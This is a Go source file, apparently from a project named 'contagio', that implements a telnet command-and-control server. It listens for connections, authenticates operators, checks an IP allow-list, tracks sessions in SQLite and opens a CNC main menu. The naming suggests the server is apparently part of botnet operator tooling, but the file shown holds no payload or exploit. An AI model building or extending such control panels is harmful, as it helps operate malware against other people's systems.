package cnc

import (
	conf "contagio/contagio/config"
	"contagio/contagio/config/logging"
	"contagio/contagio/database/sqlite"
	"net"
	"strings"
	"time"
)

var NewConnChan = make(chan net.Conn)

type Connection struct {
	config *conf.Config
	conn   net.Conn
	login  string
	s      *ServerStats
}

var Sessions int

func StartCnc(config *conf.Config) {

	defer Catch()

	telnet, err := net.Listen("tcp", config.CncServer)
	if err != nil {
		logging.PrintError("Cnc fatal error: " + err.Error())
		config.Wg.Done()
		return
	}

	s := &ServerStats{}
	go s.SaveStats()

	logging.PrintInfo("Cnc server ready: " + config.CncServer)

	go func() {
		defer Catch()
		for {

			conn, err := telnet.Accept()

			if err != nil {
				continue
			}

			NewConnChan <- conn
		}
	}()

	for {
		conn := <-NewConnChan
		c := initConn(conn, config, s)
		go c.newConn()
	}
}

func (c *Connection) newConn() {
	defer c.conn.Close()
	c.Cls()

	isAuth := c.Auth()
	if !isAuth {
		return
	}

	go c.handle()
	Sessions++
	sqlite.AddSession(Sessions)

	c.Cls()
	go c.Title()
	c.CncMainMenu()

}

func (c *Connection) handle() {
	for {
		_, err := c.conn.Write([]byte{0x0})
		if err != nil {
			Sessions--
			sqlite.AddSession(Sessions)
			c.conn.Close()
			return
		}
		time.Sleep(1 * time.Second)
	}
}

func initConn(conn net.Conn, config *conf.Config, s *ServerStats) *Connection {

	defer Catch()
	if !config.Auth.AllowAllIps {
		if !sqlite.CheckIp(strings.Split(conn.RemoteAddr().String(), ":")[0]) {
			conn.Write([]byte(conf.ParseColors(config.Auth.IpIsNotAllowedError)))
			conn.Close()
		}
	}

	return &Connection{
		s:      s,
		conn:   conn,
		config: config,
	}
}
